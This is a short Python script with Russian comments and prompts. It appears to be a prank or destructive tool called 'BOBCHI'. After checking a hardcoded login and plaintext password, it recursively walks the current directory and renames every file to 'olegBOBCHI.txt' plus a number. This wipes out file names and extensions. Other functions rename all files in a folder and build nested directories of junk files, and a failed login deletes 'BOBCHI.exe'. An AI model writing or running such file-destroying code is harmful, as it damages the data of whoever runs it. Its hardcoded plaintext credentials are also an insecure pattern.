import os
from time import sleep


def authenticate(username, password):
    # Предполагаем, что пользователи хранятся в базе данных в виде словаря
    # ключ - это логин пользователя, значение - это пароль
    users = {'pesk2305': 'Oggu1412'}

    # Проверяем, есть ли такой пользователь в базе данных
    if username not in users:
        return False

    # Проверяем, соответствует ли пароль
    if users[username] == password:
        return True

    return False

def Autoriz():
    username = input("Введите логин: ")
    password = input("Введите пароль: ")
    is_authenticated = authenticate(username, password)
    if is_authenticated:
        return True
    else:
        return False


def str(stroka):
    print('BOBCHI: ', end="")
    for slovo in stroka:
        print(slovo, end="", flush=True)
        sleep(0.05)
    print('\n')

def Menyem_1_dr():
    list_2 = os.listdir()
    count = 0
    for i in list_2:
        if i != "OLEG1.exe":
            os.rename(i, f"OLEG.BOBCHI - {count}")
        count += 1


def sodanie_papok():
    for i in range(10):
        os.mkdir(fr"123{i}")
        os.chdir(fr"123{i}")
        for j in range(10):
            test_txt = open(f"2323{j}", "w")


count = 0


def Proverka(path):
    os.chdir(fr"{path}")
    global count
    global dicts
    list_1 = os.listdir()
    for i in list_1:
        os.chdir(fr"{path}")
        if os.path.isdir(i) == True:
            print(f"YES   {os.getcwd()}\\{i}")
            Proverka(f"{os.getcwd()}\\{i}")
        else:
            os.chdir(fr"{path}")
            print(f"NO     {i}", os.listdir())
            os.rename(i, f"olegBOBCHI.txt{count}", )
            count += 1


if Autoriz() == True:
    str("BOBCHI фикация через 3 секунды")
    for i in range(1, 4):
        print(i)
        sleep(1)
        Proverka(os.getcwd())
else:
    str("Не братан без обид)))")
    os.remove("BOBCHI.exe")
